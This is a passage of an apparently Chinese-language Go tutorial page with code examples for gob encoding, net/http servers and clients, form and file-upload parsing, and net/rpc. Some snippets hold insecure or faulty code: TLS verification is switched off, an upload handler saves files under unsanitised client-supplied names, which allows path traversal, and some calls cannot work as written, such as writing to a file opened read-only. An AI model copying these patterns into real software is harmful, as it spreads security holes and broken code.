class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"encoding/gob"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Users <span class="keyword">struct</span> &#123;</span><br><span class="line">id   <span class="keyword">int</span></span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writegob</span><span class="params">()</span></span> &#123;</span><br><span class="line">users := []Users&#123;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="string">"kk"</span>&#125;,</span><br><span class="line">&#123;<span class="number">2</span>, <span class="string">"qingyang"</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gob注册，需要使用类型，如此处users为Users类型</span></span><br><span class="line">gob.Register(Users&#123;&#125;)</span><br><span class="line">file, err := os.Open(<span class="string">"users.gob"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用file创建一个encoder</span></span><br><span class="line">encoder := gob.NewEncoder(file)</span><br><span class="line"><span class="comment">// 将指定类型数据编码写入</span></span><br><span class="line">encoder.Encode(users)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readgob</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 注册</span></span><br><span class="line">gob.Register(Users&#123;&#125;)</span><br><span class="line"><span class="comment">// 打开gob文件</span></span><br><span class="line">file, err := os.Open(<span class="string">"users.gob"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码</span></span><br><span class="line"><span class="comment">// 申请变量接收，需要与写入时的一致</span></span><br><span class="line"><span class="keyword">var</span> users []Users</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line">fmt.Println(decoder.Decode(&amp;users))</span><br><span class="line">fmt.Println(users)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//writegob()</span></span><br><span class="line">readgob()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>go 原生的http库</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理静态资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">addr := <span class="string">":8888"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义处理器，FileServer用于指定文件存储位置，http.Dir 是类型转换（http封装的string类型）</span></span><br><span class="line"><span class="comment">// url: ./static/www</span></span><br><span class="line"><span class="comment">// http.Handle("/www/", http.FileServer(http.Dir("./static")))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示取消url前缀</span></span><br><span class="line"><span class="comment">// 注意访问路径为localhost:8888/static</span></span><br><span class="line"><span class="comment">// 如果不加StripPrefix则路径为localhost:8888/static/static</span></span><br><span class="line"><span class="comment">// StripPrefix 用于去掉url前缀</span></span><br><span class="line">http.Handle(<span class="string">"/static/"</span>, http.StripPrefix(<span class="string">"/static/"</span>, http.FileServer(http.Dir(<span class="string">"./static"</span>))))</span><br><span class="line">http.ListenAndServe(addr, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数名理解为用户请求处理函数</span></span><br><span class="line"><span class="comment">// 参数理解为用户的请求信息</span></span><br><span class="line"><span class="comment">// responseWriter 表示返回给用户的内容</span></span><br><span class="line"><span class="comment">// request表示接收的用户请求数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Home</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 用户提交的数据 http内容-&gt; go代码转换-&gt; http.Request获取</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fmt.Println(<span class="string">"/Home"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Help <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义处理器（对象）需要实现ServeHTTP接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Help)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"hi"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">addr := <span class="string">":8888"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// url -&gt; 找处理器函数 -&gt; 调用处理器函数(http包)</span></span><br><span class="line"><span class="comment">// 指定url和处理函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理器函数实现</span></span><br><span class="line"><span class="comment">// 第一个参数为请求url</span></span><br><span class="line"><span class="comment">// 第二个参数为处理该请求的回调函数</span></span><br><span class="line"><span class="comment">// Handle或者HandleFunc会自动注册到http.DefaultServeMux中</span></span><br><span class="line">http.HandleFunc(<span class="string">"/home"</span>, Home)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理器实现</span></span><br><span class="line">http.Handle(<span class="string">"/help"</span>, <span class="built_in">new</span>(Help))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对addr地址进行监听，调用处理程序来处理请求</span></span><br><span class="line"><span class="comment">// 第一个参数为监听地址</span></span><br><span class="line"><span class="comment">// 第二个参数为服务端处理程序，一般为nil，表示使用 http.DefaultServeMux来处理</span></span><br><span class="line">http.ListenAndServe(addr, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"crypto/tls"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 模拟器客户端</span></span><br><span class="line"><span class="comment">// 实际是对http.NewRequst方法的封装</span></span><br><span class="line">response, err := http.Get(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(response.Proto)</span><br><span class="line">fmt.Println(response.StatusCode)</span><br><span class="line">io.Copy(os.Stdout, response.Body)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义request请求方法（自定义提交对象）</span></span><br><span class="line">req, err := http.NewRequest(<span class="string">"GET"</span>, <span class="string">"http://www.baidu.com"</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 请求需要client，使用http内建结构体</span></span><br><span class="line"><span class="comment">// 此处可以设置transport结构体，从而忽略不受信的https连接</span></span><br><span class="line">client := http.Client&#123;</span><br><span class="line">Transport: &amp;http.Transport&#123;</span><br><span class="line">TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发起request请求</span></span><br><span class="line">response, err = client.Do(req)</span><br><span class="line">io.Copy(os.Stdout, response.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"encoding/json"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">http.HandleFunc(<span class="string">"/home"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Println(strings.Repeat(<span class="string">"-"</span>, <span class="number">30</span>))</span><br><span class="line">fmt.Println(<span class="string">"请求头："</span>, r.Header)</span><br><span class="line">fmt.Println(<span class="string">"请求体："</span>, r.Body)</span><br><span class="line">fmt.Println(<span class="string">"请求方法："</span>, r.Method)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.提交数据方式</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在URL中传递参数</span></span><br><span class="line"><span class="comment">url?arg1=agv1&amp;arg2=agv2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">fmt.Println(<span class="string">"URL："</span>, r.URL)</span><br><span class="line"><span class="comment">// 解析参数</span></span><br><span class="line"><span class="comment">// form解析url和body中的参数</span></span><br><span class="line"><span class="comment">// r.Form解析出来的参数都是string类型</span></span><br><span class="line">r.ParseForm()</span><br><span class="line">fmt.Println(<span class="string">"Form: "</span>, r.Form)</span><br><span class="line">fmt.Println(r.Form.Get(<span class="string">"a"</span>)) <span class="comment">// 获取指定参数（如果是a=1&amp;a=2，则只获取a=1，即只获取第一个）</span></span><br><span class="line">fmt.Println(r.Form[<span class="string">"a"</span>])     <span class="comment">// 直接使用[]获取，可以获得该参数所有值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通过body提交数据</span></span><br><span class="line"><span class="comment">// curl -d "xxxxxxx"</span></span><br><span class="line"><span class="comment">// application/x-www-form-urlencoded a=b&amp;c=d （通常用于PUT请求url传输数据）</span></span><br><span class="line"><span class="comment">// application/json</span></span><br><span class="line"><span class="comment">// multipart/form-data （通常用于POST请求提交form）</span></span><br><span class="line">fmt.Println(<span class="string">"postform"</span>, r.PostForm) <span class="comment">// postform只获取body中的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装r.form</span></span><br><span class="line">r.FormValue(<span class="string">"x"</span>)</span><br><span class="line"><span class="comment">// 封装r.postform</span></span><br><span class="line">r.PostFormValue(<span class="string">"y"</span>)</span><br><span class="line"><span class="comment">// 封装r.multipartform.file</span></span><br><span class="line">r.FormFile(<span class="string">"z"</span>)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析json</span></span><br><span class="line">http.HandleFunc(<span class="string">"/data/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">io.Copy(os.Stdout, r.Body)</span><br><span class="line">ctx, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">j := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"><span class="comment">// 将字符串[]byte转化为map</span></span><br><span class="line">json.Unmarshal(ctx, j)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传文件</span></span><br><span class="line">http.HandleFunc(<span class="string">"/file/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置文件上传大小限制，并解析Form</span></span><br><span class="line">r.ParseMultipartForm(<span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"><span class="comment">// body中可能有文件内容和k:v形式的内容</span></span><br><span class="line"><span class="comment">// File 为获取文件内容；Value为获取其他k:v内容</span></span><br><span class="line">fmt.Println(r.MultipartForm.File)</span><br><span class="line">fmt.Println(r.MultipartForm.Value)</span><br><span class="line"></span><br><span class="line"><span class="comment">// argsname表示url里对应的参数名，即"argsname=filename"</span></span><br><span class="line"><span class="comment">// 返回值是map[string][]*FileHeader</span></span><br><span class="line"><span class="keyword">if</span> fileHeaders, err := r.MultipartForm.File[<span class="string">"argsname"</span>]; err &#123;</span><br><span class="line"><span class="keyword">for</span> _, fileHeader := <span class="keyword">range</span> fileHeaders &#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fmt.Println(fileHeader.Filename, fileHeader.Size)</span><br><span class="line"><span class="comment">// open返回值为file类型</span></span><br><span class="line">sfile, _ := fileHeader.Open()</span><br><span class="line">nfile, _ := os.Create(<span class="string">"./file/"</span> + fileHeader.Filename)</span><br><span class="line">io.Copy(nfile, sfile)</span><br><span class="line">sfile.Close()</span><br><span class="line">nfile.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">http.ListenAndServe(<span class="string">":8888"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h3><p>基于不同协议的rpc调用，只是处理数据方式不同。除此外，监听的方式一样。</p><h4 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h4><p>client</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这两个结构体一般通信的结构体放在公共库内</span></span><br><span class="line"><span class="keyword">type</span> AddRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left  <span class="keyword">int</span></span><br><span class="line">Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AddResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 发起tcp连接</span></span><br><span class="line">client, _ := rpc.Dial(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化rpc用到的结构体</span></span><br><span class="line">req := AddRequest&#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">resp := &amp;AddResponse&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1：远程rpc注册的方法，以“结构体名.方法名”方式调用</span></span><br><span class="line"><span class="comment">// 参数2：req</span></span><br><span class="line"><span class="comment">// 参数3：resp</span></span><br><span class="line">err := client.Call(<span class="string">"Calc.Add"</span>, req, resp)</span><br><span class="line">fmt.Println(err, resp)</span><br><span class="line">client.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AddRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left  <span class="keyword">int</span></span><br><span class="line">Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AddResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义rpc对象</span></span><br><span class="line"><span class="keyword">type</span> Calc <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1：请求对象（指针/值）</span></span><br><span class="line"><span class="comment">// 参数2：响应对象（指针）因为需要传递出去</span></span><br><span class="line"><span class="comment">// 返回值：error</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Calc)</span> <span class="title">Add</span><span class="params">(req AddRequest, resp *AddResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">resp.Result = req.Left + req.Right</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tcp方式监听服务</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// rpc 注册</span></span><br><span class="line">rpc.Register(&amp;Calc&#123;&#125;)</span><br><span class="line">listener, _ := net.Listen(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line">rpc.Accept(listener)</span><br><span class="line">listener.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="http-1"><a href="#http-1" class="headerlink" title="http"></a>http</h4><p>client</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HttpRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left, Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HttpResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 发起http连接</span></span><br><span class="line">client, _ := rpc.DialHTTP(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义req和resp</span></span><br><span class="line">req := HttpRequest&#123;Left: <span class="number">4</span>, Right: <span class="number">2</span>&#125;</span><br><span class="line">resp := HttpResponse&#123;&#125;</span><br><span class="line">err := client.Call(<span class="string">"MyCalc.Add"</span>, req, &amp;resp)</span><br><span class="line">fmt.Println(err, resp)</span><br><span class="line">err = client.Call(<span class="string">"MyCalc.Sub"</span>, req, &amp;resp)</span><br><span class="line">fmt.Println(err, resp)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HttpRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left, Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HttpResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyCalc <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *MyCalc)</span> <span class="title">Add</span><span class="params">(req HttpRequest, resp *HttpResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">resp.Result = req.Left + req.Right</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *MyCalc)</span> <span class="title">Sub</span><span class="params">(req HttpRequest, resp *HttpResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">resp.Result = req.Left - req.Right</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// http方式监听服务</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册</span></span><br><span class="line">rpc.Register(&amp;MyCalc&#123;&#125;)</span><br><span class="line"><span class="comment">// 相当于绑定url和处理器</span></span><br><span class="line">rpc.HandleHTTP()</span><br><span class="line"><span class="comment">// http起服务</span></span><br><span class="line">http.ListenAndServe(<span class="string">":8888"</span>, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span 